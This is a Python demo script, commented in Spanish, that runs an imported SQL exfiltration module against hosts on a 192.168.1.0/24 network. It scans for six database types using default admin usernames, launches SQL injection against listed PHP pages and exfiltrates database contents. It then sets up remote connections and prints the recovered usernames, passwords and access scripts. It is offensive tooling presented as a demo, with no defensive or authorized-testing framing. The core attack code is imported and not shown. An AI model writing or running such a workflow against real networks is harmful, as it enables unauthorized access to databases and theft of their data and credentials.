#!/usr/bin/env python3
"""
Demo de Exfiltración de Bases de Datos SQL
Ejemplo de uso del módulo de exfiltración SQL
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.sql_exfiltration import SQLExfiltrationModule
import logging

def setup_logging():
    """Configurar logging para el demo"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler('sql_demo.log')
        ]
    )
    return logging.getLogger(__name__)

def main():
    """Función principal del demo"""
    logger = setup_logging()
    
    # Configuración de ejemplo
    config = {
        'network': {
            'target_network': '192.168.1.0/24',
            'interface': 'eth0'
        },
        'targets': {
            'databases': {
                'mysql': {'port': 3306, 'default_users': ['root', 'admin', 'mysql']},
                'mssql': {'port': 1433, 'default_users': ['sa', 'admin', 'administrator']},
                'postgresql': {'port': 5432, 'default_users': ['postgres', 'admin', 'root']},
                'oracle': {'port': 1521, 'default_users': ['system', 'sys', 'admin']},
                'mongodb': {'port': 27017, 'default_users': ['admin', 'root', 'user']},
                'redis': {'port': 6379, 'default_users': ['default', 'admin']}
            }
        }
    }
    
    logger.info("🚀 INICIANDO DEMO DE EXFILTRACIÓN SQL")
    
    # Crear instancia del módulo
    sql_module = SQLExfiltrationModule(config, logger)
    
    # Hosts de ejemplo basados en el reporte
    discovered_hosts = [
        {'ip': '192.168.1.5', 'vendor': 'Hewlett Packard'},
        {'ip': '192.168.1.7', 'vendor': 'Hewlett Packard'},
        {'ip': '192.168.1.12', 'vendor': 'Hewlett Packard'},
        {'ip': '192.168.1.17', 'vendor': 'Hewlett Packard'},
        {'ip': '192.168.1.18', 'vendor': 'Hewlett Packard'}
    ]
    
    # 1. Descubrir bases de datos
    logger.info("🔍 Fase 1: Descubriendo bases de datos...")
    databases = sql_module.discover_databases(discovered_hosts)
    
    if databases:
        logger.info(f"✅ Encontradas {len(databases)} bases de datos")
        for db in databases:
            logger.info(f"   - {db['type']} en {db['host']}:{db['port']} ({db['status']})")
    else:
        logger.info("❌ No se encontraron bases de datos accesibles")
    
    # 2. Realizar SQL injection en aplicaciones web
    logger.info("💉 Fase 2: Realizando ataques de SQL injection...")
    web_targets = [
        {'url': 'http://192.168.1.5/login.php'},
        {'url': 'http://192.168.1.7/search.php'},
        {'url': 'http://192.168.1.12/products.php'},
        {'url': 'http://192.168.1.17/admin.php'},
        {'url': 'http://192.168.1.18/user.php'}
    ]
    
    sql_injections = sql_module.perform_sql_injection(web_targets)
    
    if sql_injections:
        logger.info(f"✅ Encontradas {len(sql_injections)} vulnerabilidades de SQL injection")
        for injection in sql_injections:
            logger.info(f"   - {injection['url']} ({injection['type']})")
    else:
        logger.info("❌ No se encontraron vulnerabilidades de SQL injection")
    
    # 3. Exfiltrar datos de bases de datos accesibles
    logger.info("📤 Fase 3: Exfiltrando datos de bases de datos...")
    exfiltrated_data = sql_module.exfiltrate_database_data(databases)
    
    if exfiltrated_data:
        logger.info(f"✅ Exfiltrados datos de {len(exfiltrated_data)} bases de datos")
        for data in exfiltrated_data:
            logger.info(f"   - {data['type']} en {data['host']}: {len(data.get('databases', []))} bases de datos")
    else:
        logger.info("❌ No se pudieron exfiltrar datos")
    
    # 4. Establecer conexiones remotas
    logger.info("🔗 Fase 4: Estableciendo conexiones remotas...")
    remote_connections = sql_module.establish_remote_connections(databases)
    
    if remote_connections:
        logger.info(f"✅ Establecidas {len(remote_connections)} conexiones remotas")
        for conn in remote_connections:
            logger.info(f"   - {conn['type']} en {conn['host']}:{conn['port']}")
            logger.info(f"     Script: {conn['connection_script']}")
    else:
        logger.info("❌ No se pudieron establecer conexiones remotas")
    
    # 5. Mostrar resumen final
    logger.info("📊 RESUMEN FINAL:")
    logger.info(f"   - Bases de datos descubiertas: {len(databases)}")
    logger.info(f"   - SQL injections exitosos: {len(sql_injections)}")
    logger.info(f"   - Datos exfiltrados: {len(exfiltrated_data)}")
    logger.info(f"   - Conexiones remotas: {len(remote_connections)}")
    
    # 6. Mostrar comandos de acceso
    if remote_connections:
        logger.info("🔧 COMANDOS DE ACCESO:")
        for conn in remote_connections:
            logger.info(f"   {conn['type']} en {conn['host']}:{conn['port']}")
            logger.info(f"   Usuario: {conn['credentials']['username']}")
            logger.info(f"   Contraseña: {conn['credentials']['password']}")
            logger.info(f"   Script: ./{conn['connection_script']}")
            logger.info("")
    
    logger.info("✅ DEMO COMPLETADO")

if __name__ == "__main__":
    main()
